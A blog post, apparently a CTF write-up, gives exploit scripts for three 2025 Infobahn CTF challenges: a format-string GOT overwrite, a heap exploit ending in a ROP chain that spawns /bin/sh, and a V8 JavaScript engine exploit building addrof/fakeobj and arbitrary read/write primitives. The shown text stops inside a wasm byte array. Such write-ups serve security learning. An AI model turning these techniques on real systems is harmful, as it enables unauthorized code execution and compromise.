@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="PwnSet (25 solves)123456789101112131415161718from pwn import *context.arch &#x3D; &#x27;amd64&#x27;p &#x3D; remote(&#x27;pwnset.challs.infobahnc.tf&#x27;, 1337)i &#x3D; 0while True:    p.sendlineafter(&#x27;&gt;&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 Infobahn CTF">
+<meta property="og:url" content="https://blog.6p.is/2025/11/09/2025-infobahn-ctf/index.html">
+<meta property="og:site_name" content="XISOP">
+<meta property="og:description" content="PwnSet (25 solves)123456789101112131415161718from pwn import *context.arch &#x3D; &#x27;amd64&#x27;p &#x3D; remote(&#x27;pwnset.challs.infobahnc.tf&#x27;, 1337)i &#x3D; 0while True:    p.sendlineafter(&#x27;&gt;&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-09T22:17:15.000Z">
+<meta property="article:modified_time" content="2025-11-09T22:56:43.118Z">
+<meta property="article:author" content="Xisop">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2025 Infobahn CTF</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&text=2025 Infobahn CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&is_video=false&description=2025 Infobahn CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025 Infobahn CTF&body=Check out this article: https://blog.6p.is/2025/11/09/2025-infobahn-ctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&title=2025 Infobahn CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&name=2025 Infobahn CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.6p.is/2025/11/09/2025-infobahn-ctf/&t=2025 Infobahn CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSet-25-solves"><span class="toc-number">1.</span> <span class="toc-text">PwnSet (25 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Book-Manager-V2-17-solves"><span class="toc-number">2.</span> <span class="toc-text">Book Manager V2 (17 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Butterfly-Effect-14-solves"><span class="toc-number">3.</span> <span class="toc-text">The Butterfly Effect (14 solves)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-A-Brainrot-5-solves"><span class="toc-number">4.</span> <span class="toc-text">Pwn A Brainrot (5 solves)</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2025 Infobahn CTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Xisop</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-09T22:17:15.000Z" class="dt-published" itemprop="datePublished">2025-11-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="PwnSet-25-solves"><a href="#PwnSet-25-solves" class="headerlink" title="PwnSet (25 solves)"></a>PwnSet (25 solves)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwnset.challs.infobahnc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%980254c%142$n&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4207712&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(<span class="string">&#x27;Select&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(res) != <span class="number">35</span> <span class="keyword">and</span> <span class="built_in">len</span>(res) != <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Format string attack with syslog function to modify got address to a guessed oneshot gadget address</p>
+<h2 id="Book-Manager-V2-17-solves"><a href="#Book-Manager-V2-17-solves" class="headerlink" title="Book Manager V2 (17 solves)"></a>Book Manager V2 (17 solves)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;book-managerv2.challs.infobahnc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">title, author</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, title)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, title, author</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, title)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bookptrs = <span class="number">0x47E540</span></span><br><span class="line">environ = <span class="number">0x4800D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x98061</span>)</span><br><span class="line">payload += p64(bookptrs - <span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>, payload)</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">title = p64(environ)</span><br><span class="line">title += p64(bookptrs)</span><br><span class="line">title += p64(bookptrs)</span><br><span class="line"></span><br><span class="line">author = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x800</span>-<span class="number">0x20</span>)</span><br><span class="line">author += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(title, payload)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0: &quot;&#x27;</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">stack_ptr = stack_leak - <span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_ptr))</span><br><span class="line"></span><br><span class="line">title = p64(stack_ptr - <span class="number">0x20</span>)</span><br><span class="line">title += p64(bookptrs)</span><br><span class="line"></span><br><span class="line">author = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x800</span>-<span class="number">0x20</span>)</span><br><span class="line">author += p64(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, title, author)</span><br><span class="line"></span><br><span class="line">and_edx_ecx__mov_rax_rdx = <span class="number">0x0000000000406a57</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000413ef3</span></span><br><span class="line">pop_rdi_r14_r13_r12_rbx = <span class="number">0x0000000000404165</span></span><br><span class="line">pop_rsi_r13_r12_rbx = <span class="number">0x000000000040307c</span></span><br><span class="line">syscall = <span class="number">0x0000000000401085</span></span><br><span class="line"></span><br><span class="line">payload = p64(and_edx_ecx__mov_rax_rdx)</span><br><span class="line">payload += p64(pop_rsi_r13_r12_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_r14_r13_r12_rbx)</span><br><span class="line">payload += p64(stack_ptr + <span class="number">0xe0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>, payload[:<span class="number">0x20</span>], payload[<span class="number">0x20</span>:])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Classic heap challenge but written in free pascal.</p>
+<h2 id="The-Butterfly-Effect-14-solves"><a href="#The-Butterfly-Effect-14-solves" class="headerlink" title="The Butterfly Effect (14 solves)"></a>The Butterfly Effect (14 solves)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arrays = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">    double_arrays.<span class="title function_">push</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    double_arrays[i].<span class="property">length</span> = <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">        double_arrays[i].<span class="title function_">fill</span>(&#123;&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        double_arrays[i].<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double_arrays[<span class="number">0</span>].<span class="title function_">magic</span>(<span class="number">0x100</span>, <span class="number">46</span>);</span><br><span class="line">double_arrays[<span class="number">1</span>][<span class="number">8000</span>] = <span class="number">4.4</span>;</span><br><span class="line"></span><br><span class="line">double_arrays[<span class="number">2</span>].<span class="title function_">fill</span>(<span class="number">3.3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> oob_array = double_arrays[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> object_array = double_arrays[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">const</span> u64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    object_array[<span class="number">0</span>] = o;</span><br><span class="line">    f64[<span class="number">0</span>] = oob_array[<span class="number">774</span>];</span><br><span class="line">    <span class="keyword">return</span> u64[<span class="number">0</span>] &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = oob_array[<span class="number">774</span>];</span><br><span class="line">    <span class="keyword">const</span> temp = u64[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">    u64[<span class="number">0</span>] = temp + (addr &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    oob_array[<span class="number">774</span>] = f64[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> u64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">v</span>) &#123;</span><br><span class="line">    u64[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> target = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="comment">// %DebugPrint(oob_array);</span></span><br><span class="line"><span class="comment">// %DebugPrint(target);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(target)));</span><br><span class="line"><span class="keyword">let</span> double_map_lo = <span class="title function_">f2i</span>(oob_array[<span class="number">4011</span>]) &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(double_map_lo.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> double_map_hi = <span class="title function_">f2i</span>(oob_array[<span class="number">4012</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(double_map_hi.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> double_map = (double_map_hi &lt;&lt; <span class="number">32n</span>) + double_map_lo;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(double_map.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> readArr = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">    readArr[<span class="number">0</span>] = <span class="title function_">i2f</span>(double_map);</span><br><span class="line">    readArr[<span class="number">1</span>] = <span class="title function_">i2f</span>(<span class="number">0x0000000200000000n</span> + addr - <span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(<span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(readArr) - <span class="number">0x10n</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> writeArr = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">    writeArr[<span class="number">0</span>] = <span class="title function_">i2f</span>(double_map);</span><br><span class="line">    writeArr[<span class="number">1</span>] = <span class="title function_">i2f</span>(<span class="number">0x0000000200000000n</span> + addr - <span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">const</span> fakeArr = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(writeArr) - <span class="number">0x10n</span>);</span><br><span class="line">    fakeArr[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">19</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">99</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">212</span>, <span class="number">188</span>, <span class="number">197</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">228</span>, <span class="number">245</span>, <span class="number">9</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">66</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">228</span>, <span class="number">245</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">16</span>, <span class="number">66</span>, <span class="number">177</span>, <span class="number">128</span>, <span class="number">191</span>, <span class="number">168</span>, <span class="number">128</span>, <span class="number">146</span>, <span class="number">228</span>, <span class="number">245</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">24</span>, <span class="number">66</span>, <span class="number">184</span>, <span class="number">247</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">228</span>, <span class="number">245</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">32</span>, <span class="number">66</span>, <span class="number">212</span>, <span class="number">190</span>, <span class="number">197</span>, <span class="number">177</span>, <span class="number">159</span>, <span class="number">198</span>, <span class="number">244</span>, <span class="number">245</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">40</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">132</span>, <span class="number">137</span>, <span class="number">146</span>, <span class="number">164</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span></span><br><span 